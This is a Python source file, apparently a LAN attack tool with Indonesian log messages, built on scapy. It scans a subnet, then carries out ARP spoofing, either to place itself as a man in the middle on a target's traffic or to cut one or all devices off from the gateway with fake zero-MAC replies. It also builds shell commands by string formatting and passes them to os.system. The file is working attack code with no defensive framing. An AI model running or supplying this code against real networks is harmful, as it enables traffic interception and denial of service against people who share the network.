import threading
import os
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import re
import time
from scapy.all import ARP, Ether, send, sendp

spoof_thread = None
spoofing = False
block_all_threads = []
block_all_stop = threading.Event()

def arp_spoof(target_ip, spoof_ip, target_mac, interface=None):
    global spoofing
    spoofing = True
    try:
        attacker_mac = get_attacker_mac(interface)
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            hwsrc=attacker_mac
        )
        print(f"[INFO] Mulai ARP spoofing MitM ke {target_ip} (spoof {spoof_ip}) pada interface {interface} ...")
        while spoofing:
            try:
                sendp(packet, verbose=False, iface=interface)
            except Exception as e:
                print(f"[ERROR][arp_spoof/send] {e} | Target: {target_ip} | MAC: {target_mac}")
    except Exception as e:
        print(f"[ERROR][arp_spoof] {e} | Args: {target_ip}, {spoof_ip}, {target_mac}, {interface}")

def arp_block(target_ip, gateway_ip, target_mac, interface=None, stop_event=None):
    global spoofing
    spoofing = True
    try:
        fake_mac = "00:00:00:00:00:00"
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=fake_mac
        )
        print(f"[INFO] Mulai ARP BLOCK ke {target_ip} (gateway {gateway_ip}) pada interface {interface} ...")
        while spoofing and (stop_event is None or not stop_event.is_set()):
            try:
                sendp(packet, verbose=False, iface=interface)
                time.sleep(1)
            except Exception as e:
                print(f"[ERROR][arp_block/send] {e} | Target: {target_ip} | MAC: {target_mac}")
    except Exception as e:
        print(f"[ERROR][arp_block] {e} | Args: {target_ip}, {gateway_ip}, {target_mac}, {interface}")

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface=None):
    # Kirim ARP reply asli agar ARP table target kembali normal
    try:
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac
        )
        print(f"[INFO] Restore ARP {target_ip} (gateway {gateway_ip}) pada interface {interface} ...")
        for _ in range(5):
            sendp(packet, verbose=False, iface=interface)
            time.sleep(0.2)
    except Exception as e:
        print(f"[ERROR][restore_arp] {e}")

def get_attacker_mac(interface=None):
    try:
        import psutil
        addrs = psutil.net_if_addrs().get(interface, [])
        for addr in addrs:
            if addr.family.name == 'AF_LINK':
                return addr.address.upper()
    except Exception as e:
        print(f"[ERROR][get_attacker_mac] {e} | Interface: {interface}")
    return "AA:BB:CC:DD:EE:FF"  # fallback

def start_arp_spoof_thread(target_ip, spoof_ip, target_mac, interface=None, mode="mitm"):
    global spoof_thread, spoofing
    spoofing = True
    try:
        if mode == "block":
            spoof_thread = threading.Thread(
                target=arp_block, args=(target_ip, spoof_ip, target_mac, interface), daemon=True)
        else:
            spoof_thread = threading.Thread(
                target=arp_spoof, args=(target_ip, spoof_ip, target_mac, interface), daemon=True)
        spoof_thread.start()
    except Exception as e:
        print(f"[ERROR][start_arp_spoof_thread] {e} | Args: {target_ip}, {spoof_ip}, {target_mac}, {interface}, {mode}")

def stop_arp_spoof():
    global spoofing
    spoofing = False

def block_all(devices, gateway_ip, gateway_mac, interface):
    global block_all_threads, block_all_stop
    block_all_stop.clear()
    block_all_threads = []
    for dev in devices:
        if dev['mac'] != "-" and dev['ip'] != gateway_ip:
            t = threading.Thread(
                target=arp_block,
                args=(dev['ip'], gateway_ip, dev['mac'], interface, block_all_stop),
                daemon=True
            )
            t.start()
            block_all_threads.append(t)
    print(f"[INFO] Block All: {len(block_all_threads)} target(s)")

def unblock_all(devices, gateway_ip, gateway_mac, interface):
    global block_all_stop
    block_all_stop.set()
    # Restore ARP untuk semua
    for dev in devices:
        if dev['mac'] != "-" and dev['ip'] != gateway_ip:
            restore_arp(dev['ip'], gateway_ip, dev['mac'], gateway_mac, interface)
    print("[INFO] Unblock All selesai.")

def _ping_ip(ip):
    try:
        response = os.system(f"ping -n 1 -w 100 {ip} >nul")
        return ip if response == 0 else None
    except Exception as e:
        print(f"[ERROR][_ping_ip] {e} | IP: {ip}")
        return None

def get_mac_from_arp_cache(ip):
    try:
        arp_output = os.popen("arp -a").read()
        for line in arp_output.splitlines():
            if ip in line:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[1].replace('-', ':').upper()
                    if len(mac.split(':')) == 6:
                        return mac
    except Exception as e:
        print(f"[ERROR][get_mac_from_arp_cache] {e} | IP: {ip}")
    return "-"

def ping_sweep(network_cidr, max_workers=100):
    print(f"[INFO] Melakukan ping sweep di {network_cidr} ...")
    try:
        net = ipaddress.IPv4Network(network_cidr, strict=False)
        ip_list = [str(ip) for ip in net]
        active_ips = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(_ping_ip, ip_list))
        for ip in results:
            if ip:
                active_ips.append(ip)
        print(f"[INFO] Ditemukan {len(active_ips)} perangkat aktif setelah ping sweep.")
        return ip_list
    except Exception as e:
        print(f"[ERROR][ping_sweep] {e} | Network: {network_cidr}")
        return []

def scan_network(network_cidr, interface=None, timeout=1):
    print(f"[INFO] Ping scanning network {network_cidr} ...")
    try:
        ip_list = ping_sweep(network_cidr)
        time.sleep(2)
        devices = []
        for ip in ip_list:
            try:
                mac = get_mac_from_arp_cache(ip)
                devices.append({'ip': ip, 'mac': mac})
            except Exception as e:
                print(f"[ERROR][scan_network/loop] {e} | IP: {ip}")
        print(f"[INFO] Ditemukan {len(devices)} perangkat (via ping+arp lookup, termasuk .0 dan .255).")
        return devices
    except Exception as e:
        print(f"[ERROR][scan_network] {e} | Network: {network_cidr}")
        return []
